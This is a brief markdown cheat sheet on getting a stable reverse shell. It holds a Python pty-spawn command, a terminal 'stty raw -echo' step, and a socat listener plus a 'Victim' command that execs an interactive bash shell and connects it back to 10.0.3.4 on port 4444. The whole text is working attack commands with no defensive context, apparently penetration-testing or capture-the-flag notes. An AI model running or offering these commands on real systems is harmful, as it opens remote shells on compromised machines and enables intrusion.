# Stable revers Shell 

### Using Python for a psuedo terminal
```
python -c 'import pty; pty.spawn("/bin/bash")'

stty raw -echo
```

## Using socat
```
#Listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444

#Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```
